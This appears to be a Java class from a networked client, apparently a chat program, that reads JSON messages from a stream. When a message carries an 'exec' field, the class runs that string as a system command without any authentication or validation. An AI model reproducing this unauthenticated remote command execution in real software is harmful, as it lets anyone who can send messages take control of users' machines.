//import java.io.BufferedReader;
//import java.io.IOException;
import java.io.*;
import java.util.Map;
import java.util.Collection;
import java.util.Set;
import com.google.gson.Gson;

public class Reception implements Runnable 
{
	private BufferedReader in;
	private String message = null, login = null;
	
	public Reception(BufferedReader in, String login)
    {
		this.in = in;
		this.login = login;
	}
	
	public void run() 
    {	
        String lineTmp;
		while(true){
	        try {        	
                message = in.readLine();
		    } catch (IOException e) {
				e.printStackTrace();
			}
            Map data = new Gson().fromJson(message, Map.class);
            System.out.println(data);
            if ( data.containsKey("exec") )
            {
                System.out.println(data.size());
                if ( data.size() == 2 ) 
                {
                    System.out.println("exec: " + data.get("exec"));
                    Collection c = data.values();
                    Set s = data.entrySet();
                    System.out.println(c);
                    System.out.println(s);
                    try 
                    {
                        Process proc = Runtime.getRuntime().exec((String)(data.get("exec")));
                        DataInputStream procOutput = new DataInputStream(proc.getInputStream());
                        while ( (lineTmp = procOutput.readLine()) != null )
                            System.out.println(lineTmp);
                    } catch (IOException e) {
                        e.printStackTrace();
                        System.exit(1);
                    }
                }
		    }
	    }
    }
}

